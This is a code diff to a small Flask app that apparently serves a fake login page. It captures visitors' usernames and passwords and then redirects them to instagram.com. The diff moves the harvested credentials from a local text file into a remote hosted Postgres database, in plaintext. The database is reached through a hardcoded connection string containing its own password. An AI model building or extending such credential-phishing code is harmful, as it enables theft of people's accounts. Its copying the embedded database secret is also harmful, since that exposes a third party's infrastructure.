@@ -1,6 +1,18 @@
 from flask import Flask, render_template, request, redirect
 import datetime
 import os
+import psycopg2
+DATABASE_URL = "postgresql://instadb_22cb_user:T2hXnPFMuju53ZrXTbMRZmEIDIl32RI5@dpg-d25kkfh5pdvs73dn0n2g-a.oregon-postgres.render.com/instadb_22cb"
+conn = psycopg2.connect(DATABASE_URL)
+cur = conn.cursor()
+cur.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            id SERIAL PRIMARY KEY,
+            name TEXT NOT NULL,
+            passwor TEXT NOT NULL
+        )
+    ''')
+conn.commit()
 
 app = Flask(__name__)
 
@@ -9,11 +21,10 @@ def login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-
-        # Save login details to file
-        with open('logins.txt', 'a') as f:
-            f.write(f"{datetime.datetime.now()} - Username: {username}, Password: {password}\n")
-
+        name = username
+        passwor = password
+        cur.execute('INSERT INTO users (name, passwor) VALUES (%s, %s)', (name, password))
+        conn.commit()
         # Redirect to any website (e.g., Instagram)
         return redirect("https://www.instagram.com")
 
@@ -22,3 +33,4 @@ def login():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(debug=True, host='0.0.0.0', port=port)
+    
